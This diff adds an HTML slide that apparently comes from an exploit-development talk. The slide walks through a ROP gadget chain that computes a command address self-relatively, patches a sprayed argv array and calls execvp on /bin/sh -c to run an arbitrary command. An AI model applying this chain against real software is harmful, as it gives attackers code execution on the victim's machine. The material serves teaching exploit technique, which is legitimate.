@@ -1,0 +1,31 @@
+<section>
+  <h2 class="section-title">Self-relative addressing &rarr; <code>execvp</code></h2>
+  <div class="two-col">
+    <div class="col">
+      <div class="card card-red">
+        <div class="card-header">the chain (after the pivot, RSP = blob+32)</div>
+        <pre><code class="language-text">push rsp ; pop rcx ; ret      ; rcx = &amp;blob[40]
+pop rax ; ret                 ; rax = CMD_OFFSET - 0x34
+add rax, rcx ; add rax,0x12   ; rax = &amp;command   (self-relative)
+  ; ... pop rbp ; ret
+pop rdi ; ret                 ; rdi = &amp;spray.argv[2]
+mov [rdi], rax ; ... ; ret    ; argv[2] = &amp;command
+pop rdi ; ret                 ; rdi = "/bin/sh"
+pop rsi ; ret                 ; rsi = &amp;spray.argv
+call execvp@plt               ; execvp("/bin/sh",
+                              ;   {"/bin/sh","-c",&amp;cmd,NULL})</code></pre>
+      </div>
+    </div>
+    <div class="col">
+      <div class="textbox">
+        <p><span class="inline-tag tag-purple">Self-relative</span> <code>push rsp; pop rcx</code> recovers the runtime stack pointer, so <code>&amp;command</code> is computed on the fly &mdash; the command can live in the blob, with no pre-known address.</p>
+      </div>
+      <div class="textbox" style="margin-top: 12px;">
+        <p><span class="inline-tag tag-purple">Run-time <code>argv[2]</code></span> The three other <code>argv</code> cells are baked into the spray; only the command pointer is patched in via <code>mov [rdi], rax</code>.</p>
+      </div>
+      <div class="textbox" style="margin-top: 12px;">
+        <p><span class="inline-tag tag-cyan">Free literal</span> <code>argv[1] = "-c\0"</code> is taken straight from the engine&apos;s <code>.rodata</code> &mdash; one fewer spray dependency.</p>
+      </div>
+    </div>
+  </div>
+</section>
